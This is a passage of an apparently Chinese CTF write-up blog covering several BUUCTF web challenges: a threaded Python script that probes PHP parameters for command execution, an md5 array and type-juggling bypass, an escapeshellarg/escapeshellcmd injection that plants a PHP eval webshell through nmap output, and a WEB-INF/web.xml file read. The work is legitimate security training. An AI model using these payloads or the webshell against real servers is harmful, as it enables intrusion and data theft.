class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># codeing = utf-8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span>  requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">requests.adapters.DEFAULT_RETRIES = <span class=\"number\">8</span></span><br><span class=\"line\">session = requests.session()</span><br><span class=\"line\">session.keep_alive = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">sem=threading.Semaphore(<span class=\"number\">30</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">path = <span class=\"string\">&quot;D:\\DROPS\\phpstudy_pro\\WWW\\ctf\\src\\\\&quot;</span></span><br><span class=\"line\">fileNames = os.listdir(path)</span><br><span class=\"line\"></span><br><span class=\"line\">rrGET = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&quot;\\$_GET\\[\\&#x27;(\\w+)\\&#x27;\\]&quot;</span>)</span><br><span class=\"line\">rrPOST = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&quot;\\$_POST\\[\\&#x27;(\\w+)\\&#x27;\\]&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">local_file = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>,encoding=<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">fileName</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> sem:</span><br><span class=\"line\">        file = <span class=\"built_in\">open</span>(path+fileName,<span class=\"string\">&#x27;r&#x27;</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        content = file.read()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+]checking: %s&quot;</span>%fileName)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#GET</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> rrGET.findall(content):</span><br><span class=\"line\">            r = session.get(url+<span class=\"string\">&quot;%s?%s=%s&quot;</span>%(fileName,i,<span class=\"string\">&quot;echo ~guobanghhh~&quot;</span>))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;~guobanghhh~&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">                flag = fileName + <span class=\"string\">&quot;中的&quot;</span> + i + <span class=\"string\">&quot;可以用！！！&quot;</span></span><br><span class=\"line\">                <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">                local_file.write(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#POST</span></span><br><span class=\"line\">        <span class=\"comment\"># for i in rrPOST.findall(content):</span></span><br><span class=\"line\">        <span class=\"comment\">#     r = session.post(url+fileName,data=&#123;i:&quot;echo ~guobanghhh~&quot;&#125;)</span></span><br><span class=\"line\">        <span class=\"comment\">#     if &quot;~guobanghhh~&quot; in r.text:</span></span><br><span class=\"line\">        <span class=\"comment\">#         flag = fileName + &quot;中的&quot; + i + &quot;可以用！！！&quot;</span></span><br><span class=\"line\">        <span class=\"comment\">#         print(flag)</span></span><br><span class=\"line\">        <span class=\"comment\">#         local_file.write(flag)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    run(<span class=\"string\">&quot;xk0SzyKwfzw.php&quot;</span>)</span><br><span class=\"line\">    start_time = time.time()  <span class=\"comment\"># 开始时间</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[start]程序开始:&quot;</span> + <span class=\"built_in\">str</span>(start_time))</span><br><span class=\"line\">    thread_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> fileName <span class=\"keyword\">in</span> fileNames:</span><br><span class=\"line\">        t = threading.Thread(target=run,args=(fileName,))</span><br><span class=\"line\">        thread_list.append(t)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread_list:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread_list:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果就是访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</span><br></pre></td></tr></table></figure>\n\n<p>获得flag</p>\n<hr>\n<h1 id=\"MRCTF2020-Ez-bypass\"><a href=\"#MRCTF2020-Ez-bypass\" class=\"headerlink\" title=\"[MRCTF2020]Ez_bypass\"></a>[MRCTF2020]Ez_bypass</h1><p>不截图了，主页没有代码格式，贴一个源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I put something in F12 <span class=\"keyword\">for</span> you</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$flag</span>=<span class=\"string\">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;gg&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$gg</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;gg&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (md5(<span class=\"variable\">$id</span>) === md5(<span class=\"variable\">$gg</span>) &amp;&amp; <span class=\"variable\">$id</span> !== <span class=\"variable\">$gg</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You got the first step&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!is_numeric(<span class=\"variable\">$passwd</span>))</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                 <span class=\"keyword\">if</span>(<span class=\"variable\">$passwd</span>==<span class=\"number\">1234567</span>)</span><br><span class=\"line\">                 &#123;</span><br><span class=\"line\">                     <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Good Job!&#x27;</span>;</span><br><span class=\"line\">                     highlight_file(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\">                     <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;By Retr_0&#x27;</span>);</span><br><span class=\"line\">                 &#125;</span><br><span class=\"line\">                 <span class=\"keyword\">else</span></span><br><span class=\"line\">                 &#123;</span><br><span class=\"line\">                     <span class=\"keyword\">echo</span> <span class=\"string\">&quot;can you think twice??&quot;</span>;</span><br><span class=\"line\">                 &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You can not get it !&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You are not a real hacker!&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Please input first&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;Please input first</span><br></pre></td></tr></table></figure>\n\n<p>分析一波：</p>\n<ul>\n<li>第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较<code>===</code>噢。</li>\n<li>第11、17行判断passwd是非数字并且若比较<code>==</code>等于1234567</li>\n</ul>\n<p>第一个利用数组即可绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5([1,2,3]) == md5([4,5,6]) == NULL</span><br></pre></td></tr></table></figure>\n\n<p>第二个利用比较时会进行类型转换，字符串<code>1234567a</code>会被强制转换类型为整型的<code>1234567</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id[]=1&amp;gg[]=2</span><br><span class=\"line\"></span><br><span class=\"line\">POST</span><br><span class=\"line\">passwd=1234567a</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"BUUCTF-2018-Online-Tool\"><a href=\"#BUUCTF-2018-Online-Tool\" class=\"headerlink\" title=\"[BUUCTF 2018]Online Tool\"></a>[BUUCTF 2018]Online Tool</h1><p>源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;host&#x27;</span>])) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$host</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;host&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$host</span> = escapeshellarg(<span class=\"variable\">$host</span>);</span><br><span class=\"line\">    <span class=\"variable\">$host</span> = escapeshellcmd(<span class=\"variable\">$host</span>);</span><br><span class=\"line\">    <span class=\"variable\">$sandbox</span> = md5(<span class=\"string\">&quot;glzjin&quot;</span>. <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;you are in sandbox &#x27;</span>.<span class=\"variable\">$sandbox</span>;</span><br><span class=\"line\">    @mkdir(<span class=\"variable\">$sandbox</span>);</span><br><span class=\"line\">    chdir(<span class=\"variable\">$sandbox</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> system(<span class=\"string\">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class=\"variable\">$host</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数<code>escapeshellarg</code>、<code>escapeshellcmd</code>。</p>\n<p>这道题利用了两个点</p>\n<ol>\n<li><p>nmap可以将扫描的结果存储在文件里。使用方法：<a href=\"https://blog.csdn.net/weixin_34221036/article/details/92148628\">Nmap扫描结果的保存和输出</a></p>\n</li>\n<li><p>escapeshellarg+escapeshellcmd同时使用有一些漏洞</p>\n<blockquote>\n<p><a href=\"http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">谈谈escapeshellarg参数绕过和注入的问题</a></p>\n<p><a href=\"https://paper.seebug.org/164/\">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>\n</blockquote>\n</li>\n</ol>\n<p>参考博客整理一下这两个处理命令的函数同时使用时的问题：</p>\n<ol>\n<li>假如传入的参数为<code>172.17.0.2&#39; -v -d a=1</code></li>\n<li>首先经过<code>escapeshellarg</code>函数，这个函数会把单独的单引号<code>&#39;</code>加上转义符<code>\\</code>并使用单引号<code>&#39;</code>括起来，再使用单引号<code>&#39;</code>把整个参数括起来。这时候的参数是<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1&#39;</code></li>\n<li>再进入<code>escapeshellcmd</code>函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号<code>&#39;</code>不过处理，转义符<code>\\</code>再使用转义符转义，再略过一个成对的单引号<code>&#39;&#39;</code>，最后一个单引号<code>&#39;</code>再使用转义符转义。这时候的参数就成了<code>&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code></li>\n<li>最后执行的参数是<code>&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>，由于中间的<code>\\\\</code>被解释为<code>\\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白符。所以可以简化为<code> 172.17.0.2\\ -v -d a=1&#39;</code></li>\n</ol>\n<p>所以构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>\n\n<p>经过<code>escapeshellarg</code>函数会被解析成为：<code>&#39;&#39;\\&#39;&#39;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#39;\\&#39;&#39;&#39;</code></p>\n<p>再经过<code>escapeshellcmd</code>函数会被解析为：<code>&#39;&#39;\\\\&#39;&#39;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#39;\\\\&#39;&#39;&#39;</code></p>\n<p>注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了<code>1.php\\</code>不在是php文件了。所以我们的payload最终在服务器端是：<code>\\&lt;?php eval($_POST[_]) ?&gt; -oG 1.php \\ </code>。</p>\n<p>加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$host</span> = <span class=\"string\">&quot;&#x27;&lt;?php eval(<span class=\"subst\">$_POST</span>[_]) ?&gt; -oG 1.php &#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$host</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$host</span> = escapeshellarg(<span class=\"variable\">$host</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$host</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$host</span> = escapeshellcmd(<span class=\"variable\">$host</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$host</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;&lt;?php eval() ?&gt; -oG 1.php &#x27;</span><br><span class=\"line\">&#x27;&#x27;\\&#x27;&#x27;&lt;?php eval() ?&gt; -oG 1.php &#x27;\\&#x27;&#x27;&#x27;</span><br><span class=\"line\">&#x27;&#x27;\\\\&#x27;&#x27;\\&lt;\\?php eval\\(\\) \\?\\&gt; -oG 1.php &#x27;\\\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>最终请求payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?host=&#x27;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>\n\n<p>执行指令时会创建一个sandbox文件夹，访问<code>$sandbox$/1.php</code>，POST传参</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png\"></p>\n<hr>\n<h1 id=\"RoarCTF-2019-Easy-Java\"><a href=\"#RoarCTF-2019-Easy-Java\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Java\"></a>[RoarCTF 2019]Easy Java</h1><p>是java写的web程序</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png\"></p>\n<p>考点是<strong>WEB-INF/web.xml泄露</strong></p>\n<blockquote>\n<p>WEB-INF主要包含一下文件或目录: </p>\n<p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>\n<p>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </p>\n<p>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 </p>\n<p>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 </p>\n<p>/WEB-INF/database.properties：数据库配置文件 </p>\n<p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>\n</blockquote>\n<p>重点不在登陆界面，而是那个Help按钮，可以下载文件。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png\"></p>\n<p>首先尝试去读web.xml文档，添加POST请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filename=WEB-INF/web.xml</span><br></pre></td></tr></table></figure>\n<p>可以读取web.xml文件：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">web-app</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">version</span>=<span class=\"string\">&quot;4.0&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">welcome-file-list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">welcome-file</span>&gt;</span>Index<span class=\"tag\">&lt;/<span class=\"name\">welcome-file</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">welcome-file-list</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Index<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Login<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Download<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span 